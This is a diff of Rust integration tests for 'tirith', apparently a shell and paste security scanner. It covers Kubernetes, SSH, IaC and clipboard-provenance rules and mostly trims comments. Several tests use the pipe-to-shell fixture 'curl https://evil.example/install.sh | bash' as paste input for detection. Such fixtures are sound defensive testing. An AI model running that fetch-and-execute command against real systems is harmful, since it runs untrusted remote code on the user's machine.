 }
 
-/// Non-ASCII in paste is only an analysis trigger, never a sole WARN/BLOCK
-/// reason. A paste containing only non-ASCII characters (no URLs, no
-/// commands) must resolve to Allow.
+/// Non-ASCII in paste is only an analysis trigger: a paste of non-ASCII alone
+/// (no URLs/commands) must resolve to Allow.
 #[test]
 fn test_non_ascii_paste_not_sole_warn() {
     let non_ascii_inputs = [
@@ -1761,20 +1575,9 @@ fn test_tier1_matches_all_interpreters() {
     );
 }
 
-// ---------------------------------------------------------------------------
-// Lab corpus safeguard (M5 / Chunk 3)
-//
-// The `tirith lab` corpus at crates/tirith/assets/lab_corpus.toml doubles as
-// a fixture set: every non-allow scenario must produce at least one finding
-// (i.e. tier-3 rules actually ran). This catches the same class of bug as
-// `test_tier1_does_not_gate_findings` but for the lab corpus, ensuring future
-// corpus expansion does not silently lose detection coverage.
-//
-// The corpus lives inside the `tirith` crate (so `cargo package -p tirith`
-// can embed it via `include_str!`); this test reads it via a
-// `CARGO_MANIFEST_DIR`-relative path that walks across the workspace into the
-// sibling crate.
-// ---------------------------------------------------------------------------
+// Lab corpus safeguard: the `tirith lab` corpus (in the sibling `tirith` crate)
+// doubles as a fixture set — every non-allow scenario must reach tier-3 and
+// produce a finding, catching the `test_tier1_does_not_gate_findings` bug class.
 
 #[derive(Debug, Deserialize)]
 struct LabCorpusFile {
@@ -1804,8 +1607,7 @@ fn default_lab_shell() -> String {
 
 #[test]
 fn test_lab_corpus_reaches_tier3() {
-    // CARGO_MANIFEST_DIR is `crates/tirith-core`; walk to the workspace root
-    // and into the sibling `tirith` crate where the corpus now lives.
+    // Walk from `crates/tirith-core` into the sibling `tirith` crate's corpus.
     let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
         .parent()
         .unwrap()
@@ -1823,9 +1625,7 @@ fn test_lab_corpus_reaches_tier3() {
     );
 
     for scenario in &file.scenarios {
-        // Use the shared `FromStr` impls in tirith-core so this safeguard and
-        // `crates/tirith/src/cli/lab.rs::run` consume one parse table. Both
-        // sites still panic-on-unknown to surface corpus typos loudly.
+        // Shared `FromStr` impls (one parse table with `cli/lab.rs`); panic-on-unknown.
         let shell: ShellType = scenario.shell.parse().unwrap_or_else(|_| {
             panic!(
                 "Lab scenario '{}': unknown shell '{}'",
@@ -1841,9 +1641,8 @@ fn test_lab_corpus_reaches_tier3() {
         });
 
         let raw_bytes = match (scenario.raw_bytes.as_slice(), scan_context) {
-            // Mirror `run_fixture`'s fallback (CodeRabbit R13e): default the raw
-            // bytes from the input for BOTH Paste and FileScan, so lab-corpus
-            // file-scan scenarios exercise the same byte path as the main harness.
+            // Mirror `run_fixture`'s fallback: default raw bytes from input for
+            // Paste and FileScan so they exercise the same byte path.
             ([], ScanContext::Paste | ScanContext::FileScan) => {
                 Some(scenario.input.as_bytes().to_vec())
             }
@@ -1890,16 +1689,11 @@ fn test_lab_corpus_reaches_tier3() {
             verdict.findings.len()
         );
 
-        // The core safeguard: any scenario that isn't an allow must reach
-        // tier-3 and produce at least one finding. If a future refactor
-        // accidentally gates a rule out of the hot path, this fires.
+        // Core safeguard: a non-allow scenario must reach tier-3 AND produce a
+        // finding, catching a refactor that gates a rule out of the hot path.
         if expected != Action::Allow {
-            // First: the verdict actually reached the tier-3 rule layer.
-            // The test name promises "reaches_tier3" — pin the contract
-            // explicitly rather than inferring it from the presence of
-            // findings (CR follow-up). A future regression that gates the
-            // engine at tier-1 / tier-2 would otherwise still pass as long
-            // as some finding sneaks out via a byte-scan path.
+            // Pin tier-3 explicitly (not just "some finding exists" — a byte-scan
+            // finding could otherwise mask a tier-1/2 gating regression).
             assert!(
                 verdict.tier_reached >= 3,
                 "Lab scenario '{}' (expected {:?}): engine reached tier {} but the corpus requires tier-3 coverage",
@@ -1917,19 +1711,10 @@ fn test_lab_corpus_reaches_tier3() {
     }
 }
 
-// ---------------------------------------------------------------------------
-// M8 ch1 — context-rule integration tests.
-//
-// Static `command.toml` fixtures cover the "no labels → no fire" path. These
-// tests exercise the block path by seeding both a fake kube context (via
-// `KUBECONFIG`) AND a context-labels file under a temp repo (via
-// `TIRITH_POLICY_ROOT` + a fake `.git` boundary so `find_repo_root` resolves
-// to the temp dir).
-//
-// They serialize on a file-scope mutex (the crate's `TEST_ENV_LOCK` is
-// `cfg(test)`-private to the lib crate and not reachable from integration
-// tests) and clear the cache before/after each test.
-// ---------------------------------------------------------------------------
+// M8 ch1 — context-rule integration tests. Exercise the block path by seeding a
+// fake kube context (`KUBECONFIG`) + a context-labels file under a temp repo
+// (`TIRITH_POLICY_ROOT` + a fake `.git` boundary). Serialized on a file-scope
+// mutex (the crate's `TEST_ENV_LOCK` isn't reachable from integration tests).
 
 static CONTEXT_TEST_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
 
@@ -1947,8 +1732,8 @@ fn context_rule_blocks_kubectl_delete_in_labeled_prod() {
     )
     .unwrap();
 
-    // Fake .git boundary + .tirith/ dir with a policy.yaml AND a
-    // context-labels.yaml. The labels file makes `prod-us-east` critical.
+    // Fake .git boundary + .tirith/ with a policy + a labels file marking
+    // `prod-us-east` critical.
     fs::create_dir_all(dir.path().join(".git")).unwrap();
     let tirith_dir = dir.path().join(".tirith");
     fs::create_dir_all(&tirith_dir).unwrap();
@@ -1963,9 +1748,8 @@ fn context_rule_blocks_kubectl_delete_in_labeled_prod() {
     )
     .unwrap();
 
-    // SAFETY: serialized via TEST_ENV_LOCK. We set BOTH env vars before
-    // touching the engine so policy discovery + kube detection both pick
-    // up the temp paths. The disable env MUST be unset for this test.
+    // SAFETY: serialized via TEST_ENV_LOCK. Set both env vars before touching
+    // the engine; the disable env MUST be unset here.
     unsafe {
         std::env::set_var("KUBECONFIG", kube_path.display().to_string());
         std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
@@ -1990,8 +1774,7 @@ fn context_rule_blocks_kubectl_delete_in_labeled_prod() {
 
     let verdict = engine::analyze(&ctx);
 
-    // Clean up env BEFORE asserting so a failing assertion doesn't leave a
-    // polluted environment behind.
+    // Clean up env BEFORE asserting so a failure doesn't pollute the environment.
     unsafe {
         std::env::remove_var("KUBECONFIG");
         std::env::remove_var("TIRITH_POLICY_ROOT");
@@ -2093,16 +1876,9 @@ fn context_rule_allows_kubectl_get_in_labeled_prod() {
     );
 }
 
-// ---------------------------------------------------------------------------
-// M8 ch2 — SSH context-rule integration tests.
-//
-// Mirror of the M8 ch1 context-rule tests above: seed a temp
-// `.tirith/ssh-host-labels.yaml` under a fake `.git` boundary so the
-// engine's `policy.load_ssh_host_labels` picks it up; run the engine on
-// real `ssh …` commands; assert the rule fires (block) for destructive
-// inner commands and emits an Info finding (action stays Allow because
-// Info maps to Allow) for the bare-ssh case.
-// ---------------------------------------------------------------------------
+// M8 ch2 — SSH context-rule integration tests. Mirror of M8 ch1: seed a temp
+// `.tirith/ssh-host-labels.yaml` under a fake `.git`, then assert the rule blocks
+// destructive inner commands and emits Info (→ Allow) for the bare-ssh case.
 
 #[test]
 fn ssh_rule_blocks_destructive_on_labeled_host() {
@@ -2280,15 +2056,9 @@ fn ssh_rule_allows_unlabeled_host_with_destructive_inner() {
     );
 }
 
-// ---------------------------------------------------------------------------
-// M8 ch3 — IaC apply-gate integration tests.
-//
-// These tests inject a temp `state_dir()` via `XDG_STATE_HOME` so the
-// plan-hash store lives in the test scope, then exercise the
-// `IacApplyWithoutPlan` / `IacPlanHashMismatch` rules via the engine.
-// They share the `CONTEXT_TEST_LOCK` mutex because they mutate
-// `XDG_STATE_HOME` and `TIRITH_POLICY_ROOT` env vars.
-// ---------------------------------------------------------------------------
+// M8 ch3 — IaC apply-gate integration tests. Inject a temp `state_dir()` via
+// `XDG_STATE_HOME` so the plan-hash store is test-scoped, then exercise
+// `IacApplyWithoutPlan` / `IacPlanHashMismatch`. Share `CONTEXT_TEST_LOCK`.
 
 #[test]
 fn iac_rule_blocks_apply_without_plan_when_policy_on() {
@@ -2358,13 +2128,11 @@ fn iac_rule_blocks_plan_hash_mismatch_when_policy_on() {
     )
     .unwrap();
 
-    // Write a plan file with content that won't match any recorded hash —
-    // we never call `iac_plan::record_plan_hash` in this test.
+    // A plan file with no recorded hash (we never call `record_plan_hash` here).
     let plan_path = dir.path().join("tfplan");
     fs::write(&plan_path, b"NOT A REAL TF PLAN BUT NOT EMPTY").unwrap();
 
-    // Steer the iac_plans_dir under a temp XDG_STATE_HOME so this test
-    // cannot match a real recorded hash from the developer's machine.
+    // Temp XDG_STATE_HOME so this can't match a real recorded hash on the dev machine.
     let state_dir = dir.path().join("state");
     fs::create_dir_all(&state_dir).unwrap();
     let prev_xdg = std::env::var_os("XDG_STATE_HOME");
@@ -2413,11 +2181,8 @@ fn iac_rule_blocks_plan_hash_mismatch_when_policy_on() {
     );
 }
 
-/// Regression test for PR-127 review #4 — the prior plan-hash test only
-/// proved "no recorded → mismatch". This pins the full lifecycle:
-/// (a) record the original plan's hash, (b) confirm no mismatch fires
-/// against the unchanged file, (c) modify the file, (d) confirm the
-/// mismatch fires after modification.
+/// Regression (PR-127 #4): pin the full lifecycle — record hash, confirm no
+/// mismatch on the unchanged file, modify it, confirm the mismatch then fires.
 #[test]
 fn iac_rule_detects_plan_modification_after_record() {
     use tirith_core::iac_plan::{self, PlanSummary};
@@ -2519,22 +2284,11 @@ fn iac_rule_detects_plan_modification_after_record() {
     );
 }
 
-// ---------------------------------------------------------------------------
-// M12 ch1 — the `ClipboardSourceState` tri-state completes the G1 TOCTOU fix:
-// when the caller (`tirith paste --with-source`) read the companion sidecar and
-// found nothing, it sets `AbsentOrInvalid`, and the engine must NOT re-read
-// `clipboard_source.json` from disk. If it re-read, a sidecar written between the
-// CLI's read and the engine's could fire `PasteSourceMismatch` while the CLI
-// displayed "no source" — the exact disagreement the tri-state closes.
-//
-// This test plants a MATCHING sidecar on disk (so a disk read WOULD fire the
-// rule), then proves:
-//   * `AbsentOrInvalid` → the engine reads NOTHING, so no `PasteSourceMismatch`;
-//   * `Unread` (positive control, same on-disk record) → the engine DOES read it
-//     and the rule fires — confirming the planted record is genuinely matchable,
-//     so the negative assertion above is meaningful (not a false pass).
-// Shares `CONTEXT_TEST_LOCK` because it mutates `XDG_STATE_HOME`.
-// ---------------------------------------------------------------------------
+// M12 ch1 (G1 TOCTOU fix): when the caller found no sidecar it sets
+// `AbsentOrInvalid`, and the engine must NOT re-read `clipboard_source.json`.
+// Plant a MATCHING sidecar (a disk read WOULD fire the rule), then prove
+// `AbsentOrInvalid` fires nothing while `Unread` (control) does fire — confirming
+// the record is genuinely matchable. Shares `CONTEXT_TEST_LOCK` (mutates XDG_STATE_HOME).
 #[test]
 fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
     use tirith_core::clipboard::ClipboardSourceState;
@@ -2542,19 +2296,14 @@ fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
 
     let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
 
-    // A paste that pipes to a shell (so it reaches tier 3 regardless of the
-    // paste-source force-past) and carries a destination host that differs from
-    // the recorded source host — the shape that fires `PasteSourceMismatch` at
-    // HIGH (host mismatch + pipe-to-interpreter) IF the record is consulted.
+    // A pipe-to-shell paste (reaches tier 3) with a destination host differing
+    // from the recorded source — fires PasteSourceMismatch at HIGH if consulted.
     let paste = "curl https://evil.example/install.sh | bash";
-    // SHA-256 of `paste` (verified with `shasum -a 256`). The planted record's
-    // `content_sha256` matches this exactly, so the engine WOULD attribute the
-    // paste if it read the sidecar.
+    // SHA-256 of `paste`; the planted record's `content_sha256` matches it.
     let content_sha256 = "297a6c24cd4330141c0642e0e5dc088e24839b7cf1b65d7a4813dd8f401caaaa";
 
-    // Isolate `state_dir()` under a temp `XDG_STATE_HOME` and plant a MATCHING
-    // record at `state_dir()/clipboard_source.json` whose recorded source host
-    // (`docs.trusted.example`) differs from the paste's destination host.
+    // Isolate `state_dir()` and plant a MATCHING record whose source host
+    // (`docs.trusted.example`) differs from the paste destination.
     let dir = tempfile::tempdir().unwrap();
     let state_dir = dir.path().join("state");
     let tirith_state = state_dir.join("tirith");
@@ -2564,11 +2313,9 @@ fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
     );
     fs::write(tirith_state.join("clipboard_source.json"), record_json).unwrap();
 
-    // Pin `TIRITH_POLICY_ROOT` at a known-empty policy tree so an ambient repo/user
-    // `.tirith/policy.yaml` on the dev/CI machine can't reshape `PasteSourceMismatch`
-    // (allowlist/severity_overrides/rule toggles). `fail_mode: open` is the minimal
-    // neutral policy: it parses cleanly and adds no allowlist or override. Reuse the
-    // same `dir` guard so cleanup stays tied to it.
+    // Pin `TIRITH_POLICY_ROOT` at an empty policy tree so an ambient
+    // `.tirith/policy.yaml` can't reshape `PasteSourceMismatch`. `fail_mode: open`
+    // is the neutral policy (parses cleanly, no allowlist/override).
     let policy_root = dir.path().join("policy-root");
     fs::create_dir_all(policy_root.join(".tirith")).unwrap();
     fs::write(policy_root.join(".tirith/policy.yaml"), "fail_mode: open\n").unwrap();
@@ -2580,8 +2327,7 @@ fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
         std::env::set_var("TIRITH_POLICY_ROOT", policy_root.display().to_string());
     }
 
-    // Build a Paste context with the given clipboard-source tri-state. `raw_bytes`
-    // mirrors the real `tirith paste` path (the byte-scan reads it at tier 1).
+    // Build a Paste context with the given tri-state (raw_bytes as the real path).
     let analyze_paste = |state: ClipboardSourceState| {
         let ctx = AnalysisContext {
             input: paste.to_string(),
@@ -2615,9 +2361,7 @@ fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
         }
     }
 
-    // AbsentOrInvalid: the engine must not have re-read the sidecar, so no
-    // attribution and no mismatch finding — even though a matching record sits on
-    // disk.
+    // AbsentOrInvalid: no re-read → no mismatch, despite the matching disk record.
     assert!(
         !absent
             .findings
@@ -2631,9 +2375,8 @@ fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
             .collect::<Vec<_>>(),
     );
 
-    // Unread (control): the engine DID read the planted record, so the mismatch
-    // fires — proving the record is genuinely matchable and the assertion above is
-    // not a false pass against a non-matching record.
+    // Unread (control): the engine reads the record and the mismatch fires,
+    // proving the record is matchable (so the assertion above isn't a false pass).
     assert!(
         unread
             .findings
@@ -2648,33 +2391,12 @@ fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
     );
 }
 
-// ---------------------------------------------------------------------------
-// M12 ch1 — the `Loaded(rec)` arm of the `ClipboardSourceState` tri-state is the
-// whole reason the enum exists over a `bool`/`Option`: per its doc it GUARANTEES
-// the engine uses the caller's IN-MEMORY record and does NOT re-read disk, so the
-// `paste_source_mismatch` finding and the CLI-displayed attribution agree
-// byte-for-byte even if the sidecar file changes between the CLI's read and the
-// engine's (the G1 TOCTOU). Both engine branches that consult the tri-state — the
-// tier-1 force-past gate and the tier-3 dispatch — short-circuit `Loaded(rec)` to
-// the in-memory copy, never touching `state_dir()/clipboard_source.json`.
-//
-// SUBTLETY (verified against `rules/paste_provenance::check_with_record`): the
-// rule's FIRST step bails (`return Vec::new()`) when `record.matches_bytes(raw)`
-// is false — a content-hash MISMATCH means "this paste did not come from the
-// recorded source", so NO attribution and NO finding. The finding only fires when
-// the hash MATCHES (attribution proceeds) AND a destination host differs from the
-// record's `source_url` host (a HOST mismatch). So "the in-memory record says
-// mismatch" must be expressed as matching-hash + different-host, NOT a
-// non-matching hash (which would suppress the finding entirely).
-//
-// This test plants a sidecar on disk that, if re-read, says "legit source, no
-// mismatch" (matching hash + SAME host as the paste destination → no finding),
-// then hands the engine a DIFFERENT in-memory `Loaded` record (matching hash +
-// DIFFERENT host → host mismatch). The finding firing proves the engine used the
-// in-memory record, not the matching-and-benign disk record. A regression that
-// re-read disk in the `Loaded` arm would see "no mismatch" and this test fails.
-// Shares `CONTEXT_TEST_LOCK` because it mutates `XDG_STATE_HOME`.
-// ---------------------------------------------------------------------------
+// M12 ch1 — `Loaded(rec)` GUARANTEES the engine uses the caller's IN-MEMORY
+// record and never re-reads disk (the G1 TOCTOU fix). Subtlety: the rule fires
+// on matching-hash + DIFFERENT host (a non-matching hash bails at step 1, no
+// finding). So plant a disk record that says "legit" (matching hash + SAME host)
+// and hand the engine a different in-memory record (matching hash + DIFFERENT
+// host); the finding firing proves the in-memory record won. Shares `CONTEXT_TEST_LOCK`.
 #[test]
 fn paste_source_loaded_uses_in_memory_record_not_disk() {
     use tirith_core::clipboard::{ClipboardSourceRecord, ClipboardSourceState};
@@ -2682,17 +2404,13 @@ fn paste_source_loaded_uses_in_memory_record_not_disk() {
 
     let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
 
-    // A paste that pipes to a shell (corroborating signal → HIGH) with a single
-    // destination host, `evil.example`.
+    // A pipe-to-shell paste (→ HIGH) with destination host `evil.example`.
     let paste = "curl https://evil.example/install.sh | bash";
-    // SHA-256 of `paste`, verified with `printf '%s' '<paste>' | shasum -a 256`.
+    // SHA-256 of `paste`.
     let content_sha256 = "297a6c24cd4330141c0642e0e5dc088e24839b7cf1b65d7a4813dd8f401caaaa";
 
-    // Plant an on-disk record that a stray re-read would treat as the LEGIT
-    // source: its hash matches the paste AND its host equals the paste's
-    // destination host (`evil.example`) → attribution succeeds with NO host
-    // mismatch → NO finding. So if the engine wrongly re-read disk in the
-    // `Loaded` arm, `PasteSourceMismatch` would NOT fire.
+    // On-disk record that a stray re-read treats as LEGIT (matching hash + SAME
+    // host as the paste → no host mismatch → no finding).
     let dir = tempfile::tempdir().unwrap();
     let state_dir = dir.path().join("state");
     let tirith_state = state_dir.join("tirith");
@@ -2702,11 +2420,9 @@ fn paste_source_loaded_uses_in_memory_record_not_disk() {
     );
     fs::write(tirith_state.join("clipboard_source.json"), disk_record_json).unwrap();
 
-    // Pin `TIRITH_POLICY_ROOT` at a known-empty policy tree so an ambient repo/user
-    // `.tirith/policy.yaml` on the dev/CI machine can't reshape `PasteSourceMismatch`
-    // (allowlist/severity_overrides/rule toggles). `fail_mode: open` is the minimal
-    // neutral policy: it parses cleanly and adds no allowlist or override. Reuse the
-    // same `dir` guard so cleanup stays tied to it.
+    // Pin `TIRITH_POLICY_ROOT` at an empty policy tree so an ambient
+    // `.tirith/policy.yaml` can't reshape `PasteSourceMismatch`. `fail_mode: open`
+    // is the neutral policy (parses cleanly, no allowlist/override).
     let policy_root = dir.path().join("policy-root");
     fs::create_dir_all(policy_root.join(".tirith")).unwrap();
     fs::write(policy_root.join(".tirith/policy.yaml"), "fail_mode: open\n").unwrap();
@@ -2718,9 +2434,8 @@ fn paste_source_loaded_uses_in_memory_record_not_disk() {
         std::env::set_var("TIRITH_POLICY_ROOT", policy_root.display().to_string());
     }
 
-    // The IN-MEMORY record handed to the engine: SAME (matching) content hash, so
-    // attribution proceeds, but a DIFFERENT source host (`docs.trusted.example`)
-    // than the paste's destination (`evil.example`) → host mismatch → finding.
+    // In-memory record: matching hash (attribution proceeds) + DIFFERENT host
+    // (`docs.trusted.example`) → host mismatch → finding.
     let in_memory = ClipboardSourceRecord {
         updated_at: "2026-05-30T00:00:00Z".to_string(),
         content_sha256: content_sha256.to_string(),
@@ -2748,10 +2463,8 @@ fn paste_source_loaded_uses_in_memory_record_not_disk() {
     };
 
     let loaded = analyze_paste(ClipboardSourceState::Loaded(in_memory));
-    // Positive control: with NO tri-state record, the engine reads the on-disk
-    // record (matching hash + SAME host) → no host mismatch → NO finding. Proves
-    // the disk record genuinely says "legit", so the `Loaded` assertion below is
-    // observing the in-memory record, not a coincidentally-firing disk read.
+    // Control: with no tri-state record, the engine reads the disk record (same
+    // host → no finding), proving the disk side genuinely says "legit".
     let unread = analyze_paste(ClipboardSourceState::Unread);
 
     unsafe {
@@ -2765,9 +2478,8 @@ fn paste_source_loaded_uses_in_memory_record_not_disk() {
         }
     }
 
-    // SECURITY-CRITICAL: the engine used the in-memory `Loaded` record (different
-    // host → mismatch) and did NOT silently re-read the matching-and-benign disk
-    // record. A regression that re-read disk in the `Loaded` arm fails here.
+    // SECURITY-CRITICAL: the engine used the in-memory record (host mismatch),
+    // not the benign disk record. A regression that re-reads disk fails here.
     assert!(
         loaded
             .findings
@@ -2782,9 +2494,8 @@ fn paste_source_loaded_uses_in_memory_record_not_disk() {
             .collect::<Vec<_>>(),
     );
 
-    // Control: the on-disk record (matching hash + SAME host) produces NO mismatch
-    // when read via `Unread` — confirming the disk side really says "legit", so the
-    // `Loaded` finding above is the in-memory record talking, not the disk.
+    // Control: the disk record (same host) fires nothing via `Unread`, confirming
+    // the `Loaded` finding above came from the in-memory record.
     assert!(
         !unread
             .findings
@@ -2800,18 +2511,10 @@ fn paste_source_loaded_uses_in_memory_record_not_disk() {
     );
 }
 
-// ---------------------------------------------------------------------------
-// M12 ch1 — companion to the test above: prove the `Loaded(rec)` decision needs
-// ZERO disk presence. With NO `clipboard_source.json` on disk at all (so a stray
-// `read_source_record()` would return `None`), two `Loaded` records with the SAME
-// paste produce OPPOSITE verdicts purely from their in-memory contents:
-//   * matching content hash + DIFFERENT host → host mismatch → PasteSourceMismatch;
-//   * NON-matching content hash → the rule's step-1 hash guard bails → NO finding.
-// Together this shows (a) the in-memory record alone drives the verdict (no disk
-// dependency — the `Loaded` arm never stats or reads disk) and (b) the content-hash
-// guard suppresses attribution for a record whose hash does not match the paste.
-// Shares `CONTEXT_TEST_LOCK` because it mutates `XDG_STATE_HOME`.
-// ---------------------------------------------------------------------------
+// M12 ch1 — companion: `Loaded(rec)` needs ZERO disk presence. With no sidecar
+// on disk, two `Loaded` records with the SAME paste give OPPOSITE verdicts from
+// their contents alone: matching-hash + different-host fires; non-matching-hash
+// bails at the step-1 guard. Shares `CONTEXT_TEST_LOCK`.
 #[test]
 fn paste_source_loaded_hash_guard_drives_verdict_with_no_sidecar() {
     use tirith_core::clipboard::{ClipboardSourceRecord, ClipboardSourceState};
@@ -2820,14 +2523,11 @@ fn paste_source_loaded_hash_guard_drives_verdict_with_no_sidecar() {
     let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
 
     let paste = "curl https://evil.example/install.sh | bash";
-    // SHA-256 of `paste` (matches the paste); the non-matching record below uses
-    // an all-zero hash that is deliberately NOT this value.
+    // SHA-256 of `paste`; the non-matching record uses an all-zero hash.
     let matching_sha256 = "297a6c24cd4330141c0642e0e5dc088e24839b7cf1b65d7a4813dd8f401caaaa";
     let non_matching_sha256 = "0000000000000000000000000000000000000000000000000000000000000000";
 
-    // Point `state_dir()` at an EMPTY temp dir: NO `clipboard_source.json` exists,
-    // so any re-read would yield `None`. The verdict must come solely from the
-    // in-memory `Loaded` record.
+    // Empty temp `state_dir()`: no sidecar exists, so any re-read yields `None`.
     let dir = tempfile::tempdir().unwrap();
     let state_dir = dir.path().join("state");
     fs::create_dir_all(state_dir.join("tirith")).unwrap();
@@ -2836,11 +2536,9 @@ fn paste_source_loaded_hash_guard_drives_verdict_with_no_sidecar() {
         "precondition: no sidecar on disk"
     );
 
-    // Pin `TIRITH_POLICY_ROOT` at a known-empty policy tree so an ambient repo/user
-    // `.tirith/policy.yaml` on the dev/CI machine can't reshape `PasteSourceMismatch`
-    // (allowlist/severity_overrides/rule toggles). `fail_mode: open` is the minimal
-    // neutral policy: it parses cleanly and adds no allowlist or override. Reuse the
-    // same `dir` guard so cleanup stays tied to it.
+    // Pin `TIRITH_POLICY_ROOT` at an empty policy tree so an ambient
+    // `.tirith/policy.yaml` can't reshape `PasteSourceMismatch`. `fail_mode: open`
+    // is the neutral policy (parses cleanly, no allowlist/override).
     let policy_root = dir.path().join("policy-root");
     fs::create_dir_all(policy_root.join(".tirith")).unwrap();
     fs::write(policy_root.join(".tirith/policy.yaml"), "fail_mode: open\n").unwrap();
@@ -2901,8 +2599,7 @@ fn paste_source_loaded_hash_guard_drives_verdict_with_no_sidecar() {
         }
     }
 
-    // With zero disk presence, the matching-hash + different-host in-memory record
-    // alone fires the mismatch.
+    // With no disk presence, the matching-hash + different-host record alone fires.
     assert!(
         fires
             .findings
@@ -2917,9 +2614,7 @@ fn paste_source_loaded_hash_guard_drives_verdict_with_no_sidecar() {
             .collect::<Vec<_>>(),
     );
 
-    // And a Loaded record whose hash does NOT match the paste is suppressed by the
-    // rule's content-hash guard — no attribution, no finding — again with no disk
-    // dependency.
+    // And a non-matching-hash record is suppressed by the content-hash guard.
     assert!(
         !suppressed
             .findings
